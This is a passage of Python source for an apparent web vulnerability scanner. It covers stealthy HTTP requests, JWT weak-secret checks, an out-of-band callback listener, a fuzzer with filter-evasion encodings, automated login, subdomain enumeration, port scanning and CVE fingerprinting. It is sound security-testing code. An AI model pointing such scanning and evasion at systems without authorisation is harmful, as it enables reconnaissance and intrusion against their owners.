                p = urllib.parse.urlsplit(self.cfg.proxy)
                ph, pp = p.hostname or "", p.port or (80 if p.scheme=="http" else 443)
                r, w = await asyncio.wait_for(asyncio.open_connection(ph, pp), self.cfg.timeout)
                if tls:
                    w.write(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
                    await asyncio.wait_for(w.drain(), self.cfg.timeout)
                    while True:
                        ln = await asyncio.wait_for(r.readline(), self.cfg.timeout)
                        if ln in (b"\r\n",b"\n",b""): break
                    loop = asyncio.get_running_loop()
                    reader = asyncio.StreamReader()
                    proto = asyncio.StreamReaderProtocol(reader)
                    sock = w.get_extra_info("socket")
                    tr, _ = await loop.create_connection(lambda: proto, sock=sock,
                                                          ssl=ctx, server_hostname=host)
                    return _Conn(reader, asyncio.StreamWriter(tr,proto,reader,loop), key)
                return _Conn(r,w,key)
            except Exception:
                pass
        r, w = await asyncio.wait_for(
            asyncio.open_connection(host,port,ssl=ctx,server_hostname=host if tls else None),
            self.cfg.timeout)
        return _Conn(r,w,key)

    async def _throttle(self, key: Tuple[Any,...]) -> None:
        if not (self.cfg.rps or self.cfg.jitter or self.penalty.get(key)): return
        async with self.lock:
            now = time.time(); last = self.last.get(key,0.0)
            if self.cfg.rps:
                wait = 1.0/self.cfg.rps - (now-last)
                if wait>0: await asyncio.sleep(wait)
            pen = self.penalty.get(key,0.0)
            if pen>now: await asyncio.sleep(pen-now)
            if self.cfg.jitter: await asyncio.sleep(random.uniform(0,self.cfg.jitter))
            self.last[key] = time.time()

    def _mark_penalty(self, key: Tuple[Any,...], resp: Dict[str,Any]) -> None:
        try:
            st = resp["status"] or 0
            if st in (429,503):
                ra = resp["headers"].get("Retry-After","1")
                try: secs = float(ra)
                except Exception: secs = 2.0
                self.penalty[key] = time.time()+min(secs,15)
        except Exception: pass

    async def request(self, url: str, method: str="GET", headers: Optional[Dict[str,str]]=None,
                      body: Optional[bytes]=None, timeout: Optional[float]=None, follow: bool=True,
                      redirect_limit: int=5, cache: bool=False) -> Response:
        method = method.upper(); ck=(url,method,body)
        if cache and ck in self.cache: return self.cache[ck]
        p = urllib.parse.urlsplit(url)
        host = p.hostname or ""; port = p.port or (443 if p.scheme=="https" else 80)
        tls = p.scheme=="https"; key=(host,port,tls)
        path = p.path or "/"
        if p.query: path += "?"+p.query
        target = url if (self.cfg.proxy and not tls) else path
        hdrs: Dict[str,str] = {"Host":p.netloc,"User-Agent":rand_ua(self.cfg),
           "Accept":"text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
           "Accept-Language":"en-US,en;q=0.9","Connection":"keep-alive"}
        ck_header = self.cookie_header(host)
        if ck_header: hdrs["Cookie"] = ck_header
        hdrs.update(self.cfg.extra_headers)
        if headers: hdrs.update(headers)
        if body is not None and not any(k.lower()=="content-length" for k in hdrs):
            hdrs["Content-Length"] = str(len(body))
        items = list(hdrs.items())
        if self.cfg.stealth: random.shuffle(items)
        raw = ("\r\n".join([f"{method} {target} HTTP/1.1"]+[f"{k}: {v}" for k,v in items])+"\r\n\r\n").encode("latin-1","replace")
        if body: raw += body
        started=time.time(); result=Response(url=url)
        async with self._sem(key):
            await self._throttle(key); conn=None
            try:
                try:
                    conn=self.pool[key].get_nowait()
                    if time.time()-conn.used>25:
                        with contextlib.suppress(Exception):
                            conn.writer.close(); await conn.writer.wait_closed()
                        conn=None
                except asyncio.QueueEmpty: conn=None
                for attempt in range(self.cfg.retries+1):
                    try:
                        if conn is None: conn=await self._open(host,port,tls,key)
                        resp = await self._exchange(conn,raw,timeout or self.cfg.timeout)
                        break
                    except Exception:
                        if conn is not None:
                            with contextlib.suppress(Exception):
                                conn.writer.close(); await conn.writer.wait_closed()
                            conn=None
                        if attempt>=self.cfg.retries: raise
                        await asyncio.sleep(0.2*(attempt+1))
                self.count+=1; self._mark_penalty(key,resp)
                for cv in resp.get("set_cookies",[]): self._store_cookie(host,cv)
                reusable = "close" not in resp["headers"].get("Connection","").lower()
                if reusable and resp["status"] is not None:
                    conn.used=time.time(); await self.pool[key].put(conn); conn=None
                result=self._to_resp(resp,url,(time.time()-started)*1000)
            except Exception as e:  # noqa: BLE001
                result=Response(url=url, elapsed_ms=(time.time()-started)*1000,
                                error=f"{type(e).__name__}: {e}"); conn=None
            finally:
                if conn is not None:
                    with contextlib.suppress(Exception):
                        conn.writer.close(); await conn.writer.wait_closed()
        if follow and result.status in (301,302,303,307,308) and result.get("Location") and redirect_limit>0:
            loc = urllib.parse.urljoin(result.final_url or url, result.get("Location"))
            nxt = await self.request(loc, "GET" if result.status==303 else method, headers, body,
                                     timeout, follow, redirect_limit-1)
            nxt.history=[(result.status or 0,loc)]+result.history; return nxt
        if cache:
            async with self.lock: self.cache[ck]=result
        return result

    def _store_cookie(self, host: str, value: str) -> None:
        first = value.split(";")[0].strip()
        if "=" not in first: return
        k,v = first.split("=",1)
        dom = host
        m = re.search(r"(?i)domain=([^;\s]+)", value)
        if m: dom = m.group(1).lstrip(".").lower()
        self.cookies[dom][k.strip()] = v.strip()

    async def _exchange(self, conn: _Conn, raw: bytes, timeout: float) -> Dict[str,Any]:
        conn.writer.write(raw); await asyncio.wait_for(conn.writer.drain(),timeout)
        line = await asyncio.wait_for(conn.reader.readline(),timeout)
        if not line: raise ConnectionError("empty response")
        parts=line.decode("latin-1","replace").strip().split(" ",2)
        status=int(parts[1]) if len(parts)>1 and parts[1].isdigit() else 0
        reason=parts[2] if len(parts)>2 else ""
        hdrs: Dict[str,str]={}; sc: List[str]=[]
        while True:
            hl=await asyncio.wait_for(conn.reader.readline(),timeout)
            if hl in (b"\r\n",b"\n",b""): break
            if b":" in hl:
                k,v=hl.decode("latin-1","replace").split(":",1)
                k=k.strip(); hdrs[k]=v.strip()
                if k.lower()=="set-cookie": sc.append(v.strip())
        te=hdrs.get("Transfer-Encoding","").lower(); cl=hdrs.get("Content-Length","")
        if "chunked" in te: body=await self._chunked(conn.reader,timeout)
        elif cl.isdigit(): body=await asyncio.wait_for(conn.reader.readexactly(min(int(cl),8_000_000)),timeout)
        else: body=await asyncio.wait_for(conn.reader.read(),timeout)
        enc=hdrs.get("Content-Encoding","").lower()
        with contextlib.suppress(Exception):
            if "gzip" in enc: body=gzip.decompress(body)
            elif "deflate" in enc: body=zlib.decompress(body,-zlib.MAX_WBITS)
        return {"status":status,"reason":reason,"headers":hdrs,"set_cookies":sc,"raw":body}

    async def _chunked(self, reader: Any, timeout: float) -> bytes:
        out=b""
        while True:
            ln=await asyncio.wait_for(reader.readline(),timeout)
            n=int(ln.strip().split(b";")[0],16)
            if n==0:
                while await asyncio.wait_for(reader.readline(),timeout) not in (b"\r\n",b"\n",b""): pass
                break
            out+=await asyncio.wait_for(reader.readexactly(n),timeout)
            await asyncio.wait_for(reader.readexactly(2),timeout)
        return out

    def _to_resp(self, r: Dict[str,Any], url: str, ms: float) -> Response:
        raw=r["raw"]
        return Response(url=url,status=r["status"],reason=r["reason"],headers=r["headers"],
                        set_cookies=r.get("set_cookies",[]),raw=raw,
                        body=raw.decode("utf-8","replace"),elapsed_ms=round(ms,1),final_url=url)

# --------------------------------------------------------------------------- #
#  X.509 / JWT / OOB / HTML
# --------------------------------------------------------------------------- #

def _tlv(d: bytes, o: int) -> Tuple[int,int,int,int]:
    t=d[o]; o+=1; ln=d[o]; o+=1
    if ln & 0x80:
        nb=ln&0x7F; ln=int.from_bytes(d[o:o+nb],"big"); o+=nb
    return t,o,o+ln,o+ln

def _tlvs(d: bytes, s: int, e: int) -> List[Tuple[int,int,int]]:
    out=[]; p=s
    while p<e-1:
        try: t,a,b,n=_tlv(d,p)
        except Exception: break
        out.append((t,a,b)); p=b
    return out

def _oid(d: bytes, s: int, e: int) -> str:
    vals=[d[s]]; v=0
    for b in d[s+1:e]:
        v=(v<<7)|(b&0x7F)
        if not b&0x80: vals.append(v); v=0
    if len(vals)<2: return ""
    a,b=vals[0],vals[1]; first=f"{min(a//40,2)}.{a-min(a//40,2)*40}"
    return ".".join([first,str(b)]+[str(x) for x in vals[2:]])

def parse_cert(der: bytes) -> Dict[str,Any]:
    out: Dict[str,Any]={}
    try:
        _,s,e,_=_tlv(der,0); kids=_tlvs(der,s,e)
        if not kids: return out
        elems=_tlvs(der,kids[0][1],kids[0][2])
        issuer=subject=""; validity={}; san=[]; sig=""; bits=0
        for idx,(tg,ss,ee) in enumerate(elems):
            if tg==0x30 and idx>=3:
                rdn=""
                for _,ns,ne in _tlvs(der,ss,ee):
                    o=""
                    for at,as_,ae in _tlvs(der,ns,ne):
                        if at==0x06: o=_oid(der,as_,ae)
                        elif at in (0x0C,0x13,0x16):
                            val=der[as_:ae].decode("utf-8","replace")
                            rdn=("CN="+val) if o=="2.5.4.3" else ("O="+val if o=="2.5.4.10" else val)
                if not issuer and idx==3: issuer=rdn
                elif not subject and idx==5: subject=rdn
            if tg==0x30 and idx==4:
                vt=_tlvs(der,ss,ee)
                if len(vt)==2:
                    validity={"not_before":der[vt[0][1]:vt[0][2]].decode("ascii","replace"),
                              "not_after":der[vt[1][1]:vt[1][2]].decode("ascii","replace")}
            if tg==0x30 and idx==6:
                sp=_tlvs(der,ss,ee)
                if len(sp)>=2: bits=max(0,(sp[1][2]-sp[1][1])*8-1)
            if tg==0xA3:
                for _,es,ex in _tlvs(der,ss,ee):
                    for _,xs,xe in _tlvs(der,es,ex):
                        parts=_tlvs(der,xs,xe)
                        if parts and parts[0][0]==0x06 and _oid(der,parts[0][1],parts[0][2])=="2.5.29.17":
                            gn=parts[-1]
                            for _,ds,de in _tlvs(der,gn[1],gn[2]):
                                san.append(der[ds:de].decode("utf-8","replace"))
        out={"issuer":issuer,"subject":subject,"validity":validity,"san":[x for x in san if x][:80],
             "public_key_bits":bits,"fingerprint_sha256":hashlib.sha256(der).hexdigest(),
             "fingerprint_sha1":hashlib.sha1(der).hexdigest()}
    except Exception as ex: out["parse_error"]=str(ex)
    return out

def analyze_jwt(token: str) -> List[Dict[str,Any]]:
    issues=[]
    try:
        pts=token.split(".")
        if len(pts)!=3: return issues
        hdr=json.loads(b64ud(pts[0])); pl=json.loads(b64ud(pts[1])); alg=hdr.get("alg","")
        if alg.lower() in ("none",""): issues.append({"t":"CRITICAL","title":"JWT alg=none","d":"Token has no signature.","cwe":"CWE-347"})
        if alg.startswith("HS"):
            for sec in JWT_WEAK_SECRETS:
                sig=b64u(hmac.new(sec.encode(),f"{pts[0]}.{pts[1]}".encode(),hashlib.sha256).digest())
                if sig==pts[2]:
                    issues.append({"t":"CRITICAL","title":f"Weak JWT HMAC key: {sec}","d":"HMAC key brute-forced.","cwe":"CWE-798"}); break
        for k in ("jku","x5u","jwk"):
            if k in hdr: issues.append({"t":"MEDIUM","title":f"JWT header '{k}'","d":"External key reference.","cwe":"CWE-347"})
        kid=hdr.get("kid","")
        if kid and ("/" in kid or ".." in kid or "http" in kid):
            issues.append({"t":"HIGH","title":"JWT kid injection","d":sanitize(kid,80),"cwe":"CWE-22"})
        now=time.time()
        if "exp" in pl and pl["exp"]<now: issues.append({"t":"MEDIUM","title":"Expired JWT accepted","d":"exp in past.","cwe":"CWE-613"})
        for k in ("admin","role","isAdmin"):
            if k in pl and str(pl[k]).lower() in ("admin","true","1"):
                issues.append({"t":"MEDIUM","title":f"Privileged JWT claim '{k}'","d":"Token carries elevated role.","cwe":"CWE-269"})
    except Exception: pass
    return issues

class OOBServer:
    def __init__(self,cfg:Config) -> None:
        self.cfg=cfg; self.events: List[Dict[str,Any]]=[]
        self.http: Any=None; self.dns: Any=None
        self.token="ws"+hashlib.md5(os.urandom(8)).hexdigest()[:10]
    async def _handle(self, r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        try:
            line=await asyncio.wait_for(r.readline(),3)
            while await r.readline() not in (b"\r\n",b"\n",b""): pass
            self.events.append({"type":"http","data":sanitize(line.decode("latin-1","replace"),400),"ts":time.time()})
            w.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"); await w.drain()
        except Exception: pass
        finally:
            with contextlib.suppress(Exception): w.close()
    async def start(self) -> None:
        try: self.http=await asyncio.start_server(self._handle,"0.0.0.0",self.cfg.oob_http_port)
        except Exception as e: out(f"OOB HTTP bind failed: {e}","WARN"); self.http=None
        try:
            self.dns,_=await asyncio.get_running_loop().create_datagram_endpoint(
                lambda:_OOBDNS(self),local_addr=("0.0.0.0",self.cfg.oob_dns_port))
        except Exception as e: out(f"OOB DNS bind failed: {e} (HTTP-only)","WARN"); self.dns=None
    async def stop(self) -> None:
        if self.http:
            self.http.close()
            with contextlib.suppress(Exception): await self.http.wait_closed()
        if self.dns: self.dns.close()
    def url(self) -> str:
        if self.cfg.oob_domain: return f"http://{self.token}.{self.cfg.oob_domain}/x"
        return f"http://{self.cfg.host}:{self.cfg.oob_http_port}/{self.token}"
    def hits(self) -> List[Dict[str,Any]]:
        return [e for e in self.events if self.token in e.get("data","")]

class _OOBDNS(asyncio.DatagramProtocol):
    def __init__(self,oob:OOBServer) -> None: self.oob=oob
    def datagram_received(self,d:bytes,a:Any) -> None:
        with contextlib.suppress(Exception):
            name,_=_dec_name(d,12); self.oob.events.append({"type":"dns","data":name,"ts":time.time()})

class Parser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True); self.title=""; self._it=False
        self.links: List[str]=[]; self.scripts: List[str]=[]; self.forms: List[Dict[str,Any]]=[]
        self.inputs: List[Dict[str,str]]=[]; self.comments: List[str]=[]; self.emails: List[str]=[]
        self.meta: Dict[str,str]={}; self.onattrs: List[str]=[]; self._form: Optional[Dict[str,Any]]=None
        self.actions: List[str]=[]
    def handle_starttag(self,tag:str,attrs:List[Tuple[str,Optional[str]]]) -> None:
        a={k.lower():(v or "") for k,v in attrs}
        if tag=="title": self._it=True
        for k,v in a.items():
            if k.startswith("on"): self.onattrs.append(f"<{tag} {k}={sanitize(v,50)}>")
        if tag=="a" and a.get("href"): self.links.append(a["href"])
        if tag=="script" and a.get("src"): self.scripts.append(a["src"])
        if tag in ("img","iframe","embed") and a.get("src"): self.links.append(a["src"])
        if tag=="link" and a.get("href"): self.links.append(a["href"])
        if tag=="meta" and a.get("name"): self.meta[a["name"].lower()]=a.get("content","")
        if tag=="form":
            self._form={"action":a.get("action",""),"method":a.get("method","get").upper(),"inputs":[]}
            self.actions.append(a.get("action",""))
        if tag=="input" and self._form is not None:
            self.inputs.append({"name":a.get("name",""),"type":a.get("type","text"),"value":a.get("value","")})
    def handle_data(self,d:str) -> None:
        if self._it: self.title+=d.strip()+" "
        self.emails.extend(re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+",d))
    def handle_endtag(self,tag:str) -> None:
        if tag=="title": self._it=False
        if tag=="form" and self._form is not None:
            self._form["inputs"]=[i for i in self.inputs if i["name"]]
            self.forms.append(self._form); self.inputs=[]; self._form=None
    def handle_comment(self,d:str) -> None: self.comments.append(d.strip())

# --------------------------------------------------------------------------- #
#  Module registry / context / auth / fuzzer
# --------------------------------------------------------------------------- #

MODULES: List[Dict[str,Any]]=[]
def module(name:str,phase:str,category:str="Recon",default:bool=True) -> Callable:
    def deco(fn:Callable) -> Callable:
        MODULES.append({"name":name,"phase":phase,"category":category,"default":default,"fn":fn}); return fn
    return deco

@dataclass
class Context:
    cfg:Config; http:AsyncHTTP; dns:AsyncDNS; report:Report
    oob:Optional[OOBServer]; base:urllib.parse.SplitResult; root:str
    pages:List[Dict[str,Any]]=field(default_factory=list)
    targets:List[Dict[str,Any]]=field(default_factory=list)
    subdomains:Set[str]=field(default_factory=set)
    seen:Set[str]=field(default_factory=set)
    robots:Any=None
    budget:int=0
    authenticated:bool=False
    async def find(self,severity:str,category:str,title:str,detail:str="",url:str="",
                   evidence:str="",remediation:str="") -> None:
        await self.report.add(Finding(severity,category,title,detail,url,evidence,remediation))
    async def fact(self,k:str,v:Any) -> None: await self.report.fact(k,v)
    def consume(self,n:int=1) -> bool:
        if self.cfg.payload_budget and self.budget+n>self.cfg.payload_budget: return False
        self.budget+=n; return True

class Fuzzer:
    def __init__(self,ctx:Context) -> None: self.ctx=ctx; self.h=ctx.http
    def transforms(self,p:str) -> List[Tuple[str,str]]:
        out=[("raw",p)]
        with contextlib.suppress(Exception):
            out += [("url",urllib.parse.quote(p)),("double",urllib.parse.quote(urllib.parse.quote(p))),
              ("html",html.escape(p)),("case","".join(c.upper() if i%2 else c.lower() for i,c in enumerate(p))),
              ("comment",p.replace("<","<!----><").replace(" ","/**/")),("null",p+"%00"),
              ("tab",p.replace(" ","\t"))]
        return out
    def inject(self,url:str,param:str,val:str) -> str:
        p=urllib.parse.urlsplit(url); q=urllib.parse.parse_qsl(p.query,keep_blank_values=True)
        done=False; nq=[]
        for k,v in q:
            if k==param: nq.append((k,val)); done=True
            else: nq.append((k,v))
        if not done: nq.append((param,val))
        return urllib.parse.urlunsplit((p.scheme,p.netloc,p.path,urllib.parse.urlencode(nq),p.fragment))
    async def baseline(self,t:Dict[str,Any]) -> Response:
        p=t["params"][0]["name"] if t.get("params") else "x"
        return await self.h.request(self.inject(t["url"],p,"WSBASELINE987"),cache=True)
    async def send(self,t:Dict[str,Any],p:str,payload:str) -> Tuple[str,Response]:
        u=self.inject(t["url"],p,payload); return u,await self.h.request(u)
    def err(self,b:str) -> Optional[str]:
        for pat in SQL_ERRORS:
            if re.search(pat,b,re.I): return pat
        return None
    def refl(self,payload:str,b:str) -> bool:
        return payload in b or urllib.parse.quote(payload) in b or html.escape(payload) in b

async def do_login(ctx: Context) -> bool:
    """Real-world authenticated scanning: form login + CSRF auto-discovery."""
    cfg=ctx.cfg
    if cfg.cookie_values:
        for k,v in cfg.cookie_values.items(): ctx.http.set_cookie(cfg.host,k,v)
        ctx.authenticated=True
    if cfg.extra_headers.get("Authorization"):
        ctx.authenticated=True
    if not cfg.login_url:
        return False
    login=urllib.parse.urljoin(ctx.root,cfg.login_url)
    r=await ctx.http.request(login)
    pr=Parser()
    with contextlib.suppress(Exception): pr.feed(r.body)
    csrf=""
    for i in pr.inputs:
        if re.search(r"csrf|xsrf|token|nonce",i["name"],re.I): csrf=i["name"]
    data={cfg.user_field:cfg.username,cfg.pass_field:cfg.password}
    data.update(cfg.login_extra)
    if csrf:
        val=next((i["value"] for i in pr.inputs if i["name"]==csrf),"")
        data[csrf]=val
    body=urllib.parse.urlencode(data).encode()
    form=next((f for f in pr.forms if any(cfg.pass_field in i["type"] or "password" in i["type"] for i in f["inputs"])),None)
    action=urllib.parse.urljoin(login,form["action"]) if form and form["action"] else login
    method=form["method"] if form else "POST"
    lr=await ctx.http.request(action,method=method,body=body,
            headers={"Content-Type":"application/x-www-form-urlencoded","Referer":login})
    ok = ("logout" in lr.body.lower() or "sign out" in lr.body.lower()
          or (cfg.verify_login and cfg.verify_login.lower() in lr.body.lower())
          or (lr.final_url and lr.final_url.rstrip("/")!=login.rstrip("/") and lr.status==200))
    marker = cfg.verify_login.lower() in lr.body.lower() if cfg.verify_login else "logout" in lr.body.lower()
    ctx.authenticated = ok and not re.search(cfg.logout_marker,lr.body[:3000],re.I)
    await ctx.fact("authentication",{"login_url":login,"successful":ctx.authenticated,
                                     "csrf_field":csrf or None,"cookies":len(ctx.http.cookies)})
    if ctx.authenticated: out("Authenticated session established","OK")
    else: out("Login may have failed - verify with --verify-login","WARN")
    if cfg.browser_login:
        try:
            pw=importlib.import_module("playwright.async_api")
            async with pw.async_playwright() as p:
                br=await p.chromium.launch(headless=True)
                page=await br.new_page()
                await page.goto(login)
                await page.fill(f"input[name={cfg.user_field}]",cfg.username)
                await page.fill(f"input[name={cfg.pass_field}]",cfg.password)
                await page.click("button[type=submit], input[type=submit]")
                await page.wait_for_timeout(1200)
                for c in await page.context.cookies():
                    ctx.http.set_cookie(c["domain"].lstrip("."),c["name"],c["value"])
                await ctx.fact("browser_login",page.url); await br.close()
                ctx.authenticated=True; out("Playwright browser login captured session","OK")
        except Exception as e:
            out(f"Playwright unavailable/failed: {e}","WARN")
    return ctx.authenticated

# =========================================================================== #
#  RECON MODULES
# =========================================================================== #

@module("dns","recon","Recon")
async def m_dns(ctx:Context) -> None:
    host=ctx.cfg.host
    if not host: return
    recs={t:await ctx.dns.query(host,t) for t in ("A","AAAA","CNAME","MX","NS","TXT")}
    await ctx.fact("dns",recs)
    if recs["A"] or recs["AAAA"]:
        await ctx.find("INFO","Recon","DNS footprint",
            detail=f"A={recs['A'][:5]} AAAA={recs['AAAA'][:3]} MX={recs['MX'][:3]}",url=ctx.root)

@module("axfr","recon","Recon")
async def m_axfr(ctx:Context) -> None:
    with contextlib.suppress(Exception):
        ipaddress.ip_address(ctx.cfg.host); return
    r=await ctx.dns.axfr(ctx.cfg.host)
    if len(r)>2:
        await ctx.find("HIGH","Recon","DNS zone transfer (AXFR) allowed",f"{len(r)} records leaked",
            evidence="; ".join(r[:6]),url=ctx.root,remediation="Restrict AXFR to authorized nameservers.")

@module("subdomains","recon","Recon")
async def m_subdomains(ctx:Context) -> None:
    host=ctx.cfg.host
    with contextlib.suppress(Exception): ipaddress.ip_address(host); return
    found:Set[str]=set()
    for u in (f"https://crt.sh/?q=%25.{host}&output=json",
              f"https://api.certspotter.com/v1/issuances?domain={host}&include_subdomains=true&expand=dns_names"):
        r=await ctx.http.request(u,timeout=max(ctx.cfg.timeout,12))
        if r.status==200 and r.body:
            with contextlib.suppress(Exception):
                d=json.loads(r.body)
                for e in d if isinstance(d,list) else []:
                    txt=[str(e.get("name_value",""))]+list(e.get("dns_names",[]) or [])
                    for t in txt:
                        for n in str(t).split("\n"):
                            n=n.strip().lower().lstrip("*.")
                            if n.endswith(host) and re.match(r"^[a-z0-9.\-]+$",n): found.add(n)
    async def one(w:str) -> Optional[str]:
        c=f"{w}.{host}"; return c if await ctx.dns.query(c,"A",2) else None
    sem=asyncio.Semaphore(ctx.cfg.threads)
    async def lim(w:str) -> Optional[str]:
        async with sem: return await one(w)
    words=list(SUB_WORDS)
    if ctx.cfg.wordlist=="large": words+=[f"{a}-{b}" for a in ("dev","test","api","old") for b in ("1","2","app")]
    for x in await asyncio.gather(*[lim(w) for w in words],return_exceptions=True):
        if isinstance(x,str): found.add(x)
    found.discard(host); ctx.subdomains=found
    await ctx.fact("subdomains",sorted(found))
    if found: await ctx.find("INFO","Recon",f"{len(found)} subdomains discovered",
                evidence=", ".join(sorted(found)[:30]),url=ctx.root)

@module("ports","recon","Recon")
async def m_ports(ctx:Context) -> None:
    ports=ctx.cfg.ports or [21,22,23,25,53,80,110,143,443,445,587,993,1433,1521,2049,
       3306,3389,5432,5900,6379,8080,8081,8443,8888,9000,9200,9300,11211,27017,2375,10250]
    sem=asyncio.Semaphore(min(ctx.cfg.threads*2,120))
    async def probe(p:int) -> Optional[Dict[str,Any]]:
        async with sem:
            try:
                r,w=await asyncio.wait_for(asyncio.open_connection(ctx.cfg.host,p),min(ctx.cfg.timeout,2))
                ban=b""
                with contextlib.suppress(Exception):
                    w.write(b"\r\n"); await w.drain(); ban=await asyncio.wait_for(r.read(200),0.8)
                with contextlib.suppress(Exception): w.close()
                return {"port":p,"banner":sanitize(ban.decode("utf-8","replace"),90)}
            except Exception: return None
    res=[x for x in await asyncio.gather(*[probe(p) for p in ports]) if x]
    await ctx.fact("open_ports",res)
    if res:
        await ctx.find("INFO","Recon","Open ports",", ".join(str(x["port"]) for x in res),url=ctx.root)
        for x in res:
            if x["port"] in {21,23,445,1433,3306,3389,5432,6379,27017,9200,11211,2375,10250}:
                await ctx.find("HIGH" if x["port"] in (2375,10250) else "MEDIUM","Cloud",
                  f"Sensitive service exposed: {x['port']}",x["banner"],url=ctx.root,
                  remediation="Do not expose this service to untrusted networks.")

@module("tls","recon","TLS")
async def m_tls(ctx:Context) -> None:
    if ctx.cfg.scheme!="https": return
    loop=asyncio.get_running_loop()
    try:
        def f() -> bytes:
            c=ssl.create_default_context()
            if not ctx.cfg.verify_tls: c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
            with socket.create_connection((ctx.cfg.host,ctx.cfg.port or 443),ctx.cfg.timeout) as s:
                with c.wrap_socket(s,server_hostname=ctx.cfg.host) as t:
                    return t.getpeercert(binary_form=True) or b""
        der=await loop.run_in_executor(None,f)
        if not der: return
        cert=parse_cert(der); await ctx.fact("tls",cert)
        await ctx.find("INFO","TLS","TLS certificate inspected",
            detail=f"{cert.get('issuer')} | {cert.get('public_key_bits')}b | {cert.get('fingerprint_sha256','')[:16]}",
            url=ctx.root)
        if 0<(cert.get("public_key_bits") or 9999)<2048:
            await ctx.find("HIGH","Crypto","Weak TLS key",f"{cert['public_key_bits']}-bit key.",url=ctx.root)
        try:
            exp=dt.datetime.strptime(cert["validity"]["not_after"],"%b %d %H:%M:%S %Y %Z").replace(tzinfo=dt.timezone.utc)
            days=(exp-dt.datetime.now(dt.timezone.utc)).days
            if days<0: await ctx.find("CRITICAL","TLS","Expired TLS certificate",f"Expired {abs(days)}d ago.",url=ctx.root)
            elif days<21: await ctx.find("MEDIUM","TLS","Certificate expiring",f"{days} days left.",url=ctx.root)
        except Exception: pass
    except ssl.SSLCertVerificationError as e:
        await ctx.find("HIGH","TLS","Invalid TLS certificate",str(e),url=ctx.root)
    except Exception: pass

@module("favicon","recon","Recon")
async def m_favicon(ctx:Context) -> None:
    r=await ctx.http.request(ctx.root.rstrip("/")+"/favicon.ico")
    if r.status==200 and r.raw:
        h=favicon_hash(r.raw); await ctx.fact("favicon_hash",h)
        await ctx.find("INFO","Recon","Favicon fingerprint",f"murmurhash={h}",url=ctx.root)

@module("waf","recon","Recon")
async def m_waf(ctx:Context) -> None:
    r=await ctx.http.request(ctx.root)
    if r.error: return
    hdr=" ".join(r.headers.values()); cook=r.get("Set-Cookie")
    for n,l,p in WAF_SIGS:
        hay=hdr if l=="header" else cook
        if hay and re.search(p,hay,re.I):
            await ctx.fact("waf",n)
            await ctx.find("INFO","Recon",f"WAF/CDN: {n}","Payloads may be filtered/logged.",url=ctx.root); return
    techs=list(ctx.report.facts.get("technologies",[]))
    for n,l,p in TECH_SIGS:
        hay=hdr if l=="header" else (cook if l=="cookie" else r.body[:150000])
        if hay and re.search(p,hay,re.I) and n not in techs: techs.append(n)
    if techs:
        await ctx.fact("technologies",sorted(techs))
        await ctx.find("INFO","Recon","Technology stack",", ".join(sorted(techs)),url=ctx.root)
        # version -> CVE intelligence
        hay_all=hdr+" "+r.body[:150000]
        for tn,ver_re,test,cve,sev,title in TECH_CVES:
            if tn not in techs: continue
            m=re.search(ver_re,hay_all,re.I)
            if not m: continue
            try:
                nums=tuple(int(x) for x in m.group(1).split("."))[:3]
                nums=nums+(0,)*(3-len(nums))
                if test(*nums):
                    await ctx.find(sev,"CVE",f"{cve}: {title}",
                        f"Detected {tn} {m.group(1)}.",url=ctx.root,evidence=cve,
                        remediation=f"Upgrade {tn} to a patched release.",cwe="CWE-1104")
            except Exception: pass

@module("whois","recon","Recon")
async def m_whois(ctx:Context) -> None:
    r=await ctx.http.request(f"https://rdap.org/domain/{ctx.cfg.host}",timeout=10)
    if r.status==200 and r.body:
        with contextlib.suppress(Exception):
            d=json.loads(r.body)
            f={"events":{e.get("eventAction"):e.get("eventDate") for e in d.get("events",[])},
               "nameservers":[n.get("ldhName") for n in d.get("nameservers",[])]}
            await ctx.fact("rdap",f)
            await ctx.find("INFO","Recon","RDAP registration data",
                detail=f"NS: {f['nameservers']}",url=ctx.root)

# =========================================================================== #
#  DISCOVERY MODULES
# =========================================================================== #

@module("robots","discovery","Discovery")
async def m_robots(ctx:Context) -> None:
    r=await ctx.http.request(ctx.root.rstrip("/")+"/robots.txt")
    if r.status==200 and r.body:
        await ctx.fact("robots_txt",sanitize(r.body,6000))
        rp=urllib.robotparser.RobotFileParser(); rp.parse(r.body.splitlines()); ctx.robots=rp
        for ln in r.body.splitlines():
            m=re.match(r"\s*Sitemap:\s*(\S+)",ln,re.I)
            if m:
                sr=await ctx.http.request(m.group(1))
                if sr.status==200:
                    locs=re.findall(r"<loc>\s*(.*?)\s*</loc>",sr.body,re.I)
                    await ctx.fact("sitemap_urls",locs[:300])

@module("crawl","discovery","Discovery")
async def m_crawl(ctx:Context) -> None:
    q=collections.deque([(ctx.cfg.target,0)]); n=0
    while q and n<ctx.cfg.max_pages:
        url,depth=q.popleft(); norm=urllib.parse.urlunsplit(urllib.parse.urlsplit(url)[:4]+("",))
        if norm in ctx.seen: continue
        if ctx.robots and ctx.cfg.respect_robots:
            with contextlib.suppress(Exception):
                if not ctx.robots.can_fetch("*",url): continue
        ctx.seen.add(norm)
        r=await ctx.http.request(url)
        if r.error or (r.status and r.status>=400): continue
        if "html" not in r.get("Content-Type","").lower() and "<html" not in r.body[:1500].lower(): continue
        p=Parser()
        with contextlib.suppress(Exception): p.feed(r.body)
        page={"url":url,"status":r.status,"title":p.title.strip(),"links":p.links,
              "scripts":p.scripts,"forms":p.forms,"emails":sorted(set(p.emails)),
              "comments":p.comments[:20],"meta":p.meta,"onattrs":p.onattrs[:20],
              "sha256":hashlib.sha256(r.body.encode("utf-8","replace")).hexdigest()}
        ctx.pages.append(page); ctx.report.pages.append(page); n+=1
        qu=urllib.parse.urlsplit(url).query
        if qu and len(ctx.targets)<ctx.cfg.max_targets:
            ps=[{"name":k,"loc":"query"} for k,_ in urllib.parse.parse_qsl(qu,keep_blank_values=True)]
            if ps: ctx.targets.append({"url":url,"params":ps})
        for f in p.forms:
            if len(ctx.targets)<ctx.cfg.max_targets:
                act=urllib.parse.urljoin(url,f["action"]) or url
                ps=[{"name":i["name"],"loc":"body"} for i in f["inputs"]]
                if ps: ctx.targets.append({"url":act,"params":ps,"method":f["method"]})
        if p.onattrs:
            await ctx.find("LOW","XSS","Inline event handlers",
